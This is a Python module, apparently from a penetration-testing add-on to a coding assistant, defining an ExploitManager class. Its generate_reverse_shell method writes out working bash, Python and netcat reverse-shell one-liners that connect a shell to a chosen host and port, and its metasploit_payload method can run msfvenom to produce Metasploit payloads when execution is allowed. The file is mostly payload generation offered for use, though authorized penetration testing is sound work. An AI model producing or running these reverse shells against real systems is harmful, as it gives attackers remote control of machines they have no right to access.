"""
ExploitManager for PentestAider.
Generates and simulates exploit payloads (safe/unsafe).
"""
from aider.pentest.utils import command_exists
from aider.run_cmd import run_cmd

class ExploitManager:
    def __init__(self, io, allow_exec=False):
        self.io = io
        self.allow_exec = allow_exec
        self.results = []

    def generate_reverse_shell(self, shell_type, lhost, lport):
        payload = ""
        if shell_type == "bash":
            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        elif shell_type == "python":
            payload = (
                f"python -c 'import socket,os,pty;"
                f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
                f"pty.spawn(\"/bin/bash\")'"
            )
        elif shell_type == "nc":
            payload = f"nc -e /bin/bash {lhost} {lport}"
        else:
            payload = "(unsupported shell type)"
        self.results.append(("reverse_shell", payload))
        return payload

    def metasploit_payload(self, payload_type, lhost, lport):
        tool = "msfvenom"
        if not self.allow_exec:
            msg = f"(safe) Would generate msfvenom payload {payload_type} for {lhost}:{lport}"
            self.io.tool_output(msg)
            self.results.append((tool, msg))
            return ""
        if not command_exists(tool):
            msg = "msfvenom not found in PATH."
            self.io.tool_output(msg)
            self.results.append((tool, msg))
            return ""
        cmd = [
            tool, 
            "-p", payload_type,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "raw"
        ]
        self.io.tool_output(f"Running msfvenom for {payload_type} ...")
        try:
            output = run_cmd(cmd, timeout=60)
            lines = output.splitlines()[:10]
            for line in lines:
                self.io.tool_output(line)
            snippet = "\n".join(lines)
            if len(output.splitlines()) > 10:
                self.io.tool_output("...(output truncated)...")
                snippet += "\n...(output truncated)..."
            self.results.append((tool, snippet))
            return output
        except Exception as e:
            err = f"Error running msfvenom: {e}"
            self.io.tool_output(err)
            self.results.append((tool, err))
            return ""

    def get_results(self):
        return self.results